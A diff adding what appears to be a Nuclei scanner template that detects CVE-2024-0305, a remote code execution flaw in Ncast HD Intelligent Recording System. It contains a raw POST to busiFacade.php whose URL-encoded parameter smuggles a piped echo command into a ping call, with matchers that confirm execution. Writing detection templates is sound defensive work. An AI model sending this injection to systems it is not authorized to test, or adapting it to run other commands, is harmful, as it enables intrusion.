@@ -1,0 +1,38 @@
+id: cve-2024-0305
+info:
+  name: Ncast HD Intelligent Recording System busiFacade.php RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,cve-2024-0305
+  description: |
+    Ncast HD Intelligent Recording System's busiFacade.php endpoint is vulnerable to remote code execution due to improper input sanitization.
+
+variables:
+  t1: "{{md5(rand_int(1000, 10000))}}"
+
+http:
+  - raw:
+      - |
+        POST /classes/common/busiFacade.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        %7B%22name%22:%22ping%22,%22serviceName%22:%22SysManager%22,%22userTransaction%22:false,%22param%22:%5B%22ping%20127.0.0.1%20%7C%20echo%20{{t1}}%22%5D%7D
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t1}}"
+        part: body
+      - type: word
+        words:
+          - "$#str#$"
+        part: body
+      - type: word
+        words:
+          - "<"
+        negative: true
+        part: body
